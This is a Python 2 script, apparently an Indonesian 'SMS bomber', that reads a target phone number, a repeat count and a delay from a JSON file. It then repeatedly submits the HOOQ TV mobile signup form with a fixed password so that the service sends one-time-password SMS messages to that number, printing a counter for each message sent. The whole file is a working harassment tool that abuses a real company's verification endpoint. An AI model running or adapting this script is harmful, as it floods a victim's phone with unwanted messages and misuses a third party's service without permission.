# -*- coding: utf-8 -*-
import json, mechanize, os, requests, sys, time
# Ahmad Khoirul Marzuqin
from warna import *
# Ahmad Khoirul Marzuqin
reload (sys)
# Ahmad Khoirul Marzuqin
sys.setdefaultencoding ("utf8")
# Ahmad Khoirul Marzuqin
print u + 53 * "═"
# Ahmad Khoirul Marzuqin
def irul():
	with open ("nomor.json") as baca:
		jl = json.load(baca)
		nomor = jl["nomor"]
		jumlah = int(jl["jumlah"])
		jeda = jl["jeda"]
		nomer = nomor[1:]
		try:
			for j in range (1, jumlah + 1):
				br = mechanize.Browser()
				br.set_handle_equiv(True)
				br.set_handle_gzip(True)
				br.set_handle_redirect(True)
				br.set_handle_referer(True)
				br.set_handle_robots(False)
				br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
				br.addheaders = [("User-Agent","Mozilla/8.0 (Linux; U; Android 8.1)")]
				br.open ("https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7")
				br.select_form(nr=0)
				br.form["mobile"] = nomer
				br.form["password"] = "JEKITUT"
				rbs = br.submit().read()
				if str("confirmotp") in str(rbs):
					print k +"Sms"+ c +" HOOQTV "+ n +"•"+ h +" Mengirim Pesan Sms : "+ b + str(j) + h +" ✓   \r"
				else:
					print k +"Sms"+ c +" HOOQTV "+ n +"•"+ m +" limited "+ n +"or"+ m +" connection lost\r"
				os.system ("sleep "+ jeda)
		except (KeyError, IOError):
			titik = ["     ", ".    ", "..   ", "...  ", ".... ", "....."]
			for t in titik:
				print m +"\r!!! Aktifkan Koneksi Internet "+ n + t,
				sys.stdout.flush()
				time.sleep (1)
			irul()
# Ahmad Khoirul Marzuqin
irul()
# Ahmad Khoirul Marzuqin